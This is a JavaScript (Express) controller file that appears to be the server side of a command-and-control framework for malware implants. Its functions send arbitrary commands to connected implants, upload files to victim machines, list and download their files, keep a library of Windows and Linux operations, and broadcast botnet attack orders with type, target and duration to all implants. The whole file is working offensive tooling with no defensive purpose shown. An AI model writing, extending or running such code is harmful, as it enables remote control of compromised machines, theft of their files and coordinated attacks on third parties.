import { response } from "express";
import fs from 'fs';
import Operation from '../models/Operations_model.mjs';
import Implant from '../models/Implant_model.mjs';
import { writeLog } from "../Utils/writeLog.mjs";


const send_cmd = async (clients, req, res, status_connections) => {

    const clientId = req.params?.id || "";
    const client = clients.agents.get(clientId);

    
    for( const key in req.body ){
        if(key === "finish"){
            try {
                    try {
                        client.send(JSON.stringify(req.body));
                        client.close();
                    } catch (error) {
                        console.log("Implant not connected, removing from database");
                    }
            
                    try {
                        const foundImplant = await Implant.findOne({impl_id: clientId})
                        await Implant.findByIdAndDelete(foundImplant._id);
                    } catch (error) {
                        console.log("Implant not in database");
                    }
            
                    
                clients.agents.delete(clientId);
                status_connections.status_connections = status_connections.status_connections.filter(c=> c.id != clientId);

                } catch (error) {
                    
                    return res.status(400).json({
                        ok:false,
                        msg:"Error removing implant"
                    })
                }

            }else{

                try {
                
                    if (!client || client.readyState !== 1) {
                        return res.status(404).json({ error: 'Disconnected client' });
                    }

                    const msgHandler = (msg) => {
                        try {
                            const parsed = JSON.parse(msg);
                            
                            res.status(200).json(parsed);
                        } catch (e) {
                            res.status(200).json({ result: msg });
                        }
                        client.off('message', msgHandler);
                    };
            
                
                    client.on('message', msgHandler);
                    client.send(JSON.stringify(req.body));
                
                    setTimeout(() => {
                        client.off('message', msgHandler);
                        if (!res.headersSent) {
                            res.status(504).json({ error: 'Timeout client error' });
                        }
                    }, 5000);

            } catch (error) {
                console.log(error);
            }    
        }
    }   


};


const upload_file = async (clients, req, res) => {
    try {
        const clientId = req.params.id;
        const client = clients.agents.get(clientId);
        const destination = req.body.destination;

        if (!client || client.readyState !== 1) {
            return res.status(404).json({ error: 'Client has been disconnected' });
        }

        const chunkSize = 64 * 1024;
        const buffer = req.file.buffer;
        let offset = 0;

        // Crear una promesa para esperar confirmación
        const uploadConfirmed = new Promise((resolve, reject) => {
            const handleMessage = (message) => {
                try {
                    const msg = JSON.parse(message);
                    if (msg.status === "upload_complete") {
                        client.off('message', handleMessage);
                        resolve();
                    }
                } catch (e) {}
            };

            client.on('message', handleMessage);

            setTimeout(() => {
                client.off('message', handleMessage);
                reject(new Error("Timeout for incoming connection"));
            }, 100000);
        });

        // Enviar los chunks
        while (offset < buffer.length) {
            const chunk = buffer.slice(offset, offset + chunkSize);
            client.send(JSON.stringify({
                destination,
                chunk: {
                    data: chunk.toString('base64'),
                    last: offset + chunkSize >= buffer.length
                }
            }));
            offset += chunkSize;
        }

        // Esperar a que el cliente C# confirme que terminó
        await uploadConfirmed;

        return res.status(200).json({ ok:true, msg: "Upload successful" });

    } catch (error) {
        console.error("Upload error", error);
        return res.status(400).json({ ok:false, msg: "Upload error" });
    }
};




const getFiles= async(clients, req, res = response) => {

    const path = req.body.path || "/";
    const clientId = req.body.id;

    const client = clients.agents.get(clientId);

    if (!client || client.readyState !== 1) {
        return res.status(404).json({ error: 'Client has been disconnected' });
    }

    const msgHandler = (msg) => {

        try {
            const parsed = JSON.parse(msg);
            res.status(200).json(parsed);
        } catch (e) {
            res.status(200).json({ result: msg });
        }
        client.off('message', msgHandler);
    };

    client.on('message', msgHandler);
    client.send(JSON.stringify({list_files:"list_files", path}));

    setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout client error' });
        }
    }, 5000);

    
};

// Descargar archivo
const downloadFiles=async (clients, req, res = response) => {
    const path = req.body.path || "/";
    const clientId = req.body.id;
    const client = clients.agents.get(clientId);


    if (!client || client.readyState !== 1) {
        return res.status(404).json({ error: 'Client has been disconnected' });
    } 

    let receivedChunks = [];
    let expectedFile = null;

    const msgHandler = (msg) => {
        try {
            const parsed = JSON.parse(msg);

            if (parsed.chunk) {
                receivedChunks.push(Buffer.from(parsed.chunk, 'base64'));

                if (!expectedFile) expectedFile = parsed.filename || 'archivo.bin';

                if (parsed.last) {
                    const fileBuffer = Buffer.concat(receivedChunks);
                    res.setHeader("Content-Disposition", `attachment; filename="${expectedFile}"`);
                    res.setHeader("Content-Type", "application/octet-stream");
                    res.send(fileBuffer);

                    client.off('message', msgHandler);
                    receivedChunks = [];
                    expectedFile = null;
                }
            } else if (parsed.error) {
                res.status(404).json({ error: parsed.error });
                client.off('message', msgHandler);
            }
        } catch (e) {
            res.status(500).json({ error: "Error processing file" });
            client.off('message', msgHandler);
        }
    };

    client.on('message', msgHandler);

    // Enviar solicitud de archivo al cliente Python
    client.send(JSON.stringify({ get_files: path }));

    // Timeout para evitar dejar colgado el cliente si no responde
    setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout client error' });
        }
    }, 5000);
};

const botnet_attack=(clients, attacks_running, req, res = response)=>{

    
    const attack_name = Object.keys(req.body)[0];
    const attack_value=req.body[attack_name];
    const attack=req.body
    attacks_running.botnetErrs = {};

    /* 
        Si es un ataque:
        {
            attack:{
                type:"tipo_ataque",
                target: "objetivo",
                duration: segundos
            }
        }

        Si se detienen todos los ataques:
        {
            stop_attack:''
        }
    
        Si se detienen un ataque específico:
        {
            stop_attack:'tipo_ataque'
        }
    */
    
   const msgHandler = (msg, client) => {
    try {
        const parsed = JSON.parse(msg);
        if(parsed.status && parsed.status === "attack_error"){
            writeLog(`${parsed.impl} failed in ${parsed.attack_type}`)
            attacks_running.attacks = attacks_running.attacks.filter(a =>
                a.attack_type !== parsed.attack_type
            );
        }
        return;

    } catch (e) {
        res.status(500).json({ error: "Error!!" });
        client.off('message', msgHandler);
    }
    };


    for (const [clientid, client] of clients.agents) {

        try{
            const sendsmsg = client.send(JSON.stringify(req.body));

            console.log(sendsmsg);
            
            client.on('message', msgHandler);

        }catch(err){
            console.log(err);
        }
    }




    // Si el mensaje del implante hacia el backend falla, el controller limpia el estado de running_attacks en este punto
    if(attack_name === 'stop_attack' ){
        if(attack_value.length === 0){
            attacks_running.attacks=[]
        }else{
            attacks_running.attacks = attacks_running.attacks.filter(a =>
                a.attack_type !== attack_value
            );
        }
    }
 
    return res.status(200).json({msg:"Sent"})


/*     setTimeout(() => {
        client.off('message', msgHandler);
        if (!res.headersSent) {
            res.status(504).json({ error: 'Timeout client error' });
        }
    }, 5000); */
}

const getOperations= async( req, res = response) => {

    try {


        const { sys="windows" } = req.body; 
        
        const operations = await Operation.find({sys}).select('category command name sys');

        return res.status(200).json({
            ok:true,
            operations
        })
        
    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok:false,
            msg:"Error fetching operations"
        })
    }

    
};

const add_command= async( req, res = response) => {

    try {
        const { sys="windows", command="", category="", name="" } = req.body; 
        
        if( command.length <=0 || name.length <=0 || category.length <=0 ){
            console.log("Fields shouldn't be empty");
            return res.status(400).json({
                ok:false,
                msg:"Fields shouldn't be empty"
            });
        }

        if( sys != "windows" && sys != 'linux'  ){
            console.log("Invalid operating system");
            return res.status(400).json({
                ok:false,
                msg:"Invalid operating system"
            });
        }

        
        const found_cmd = await Operation.findOne({sys,command,category,name})

        if (found_cmd){
            console.log("command exists");
            return res.status(400).json({
                ok:false,
                msg:"Command already exists"
            })
        }
        
        const new_cmd = new Operation({sys,command,category,name});   

        await new_cmd.save();

        return res.status(200).json({
            ok:true,
            msg:"New command added"
        })
        
    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok:false,
            msg:"Error creating command"
        })
    }

    
};

const delete_command= async( req, res = response) => {

    try {
        const { sys="windows", command="", category="", name="" } = req.body; 
        
        if( command.length <=0 || name.length <=0 || category.length <=0 ){
            return res.status(400).json({
                ok:false,
                msg:"Error fields"
            });
        }

        if( sys != "windows" && sys != 'linux'  ){
            console.log("Invalid operating system");
            return res.status(400).json({
                ok:false,
                msg:"Invalid operating system"
            });
        }

        
        const found_cmd = await Operation.findOne({sys,command,category,name})

        if (!found_cmd){
            console.log("Command doesn't exists");
            return res.status(400).json({
                ok:false,
                msg:"Command doesn't exists"
            })
        }

        await Operation.findByIdAndDelete(found_cmd._id);

        return res.status(200).json({
            ok:true,
            msg:"Command deleted"
        })
        
    } catch (error) {
        console.log(error);
        return res.status(400).json({
            ok:false,
            msg:"Error deleting command"
        })
    }

    
};



export{ send_cmd, upload_file, getFiles, downloadFiles, botnet_attack, getOperations, add_command, delete_command }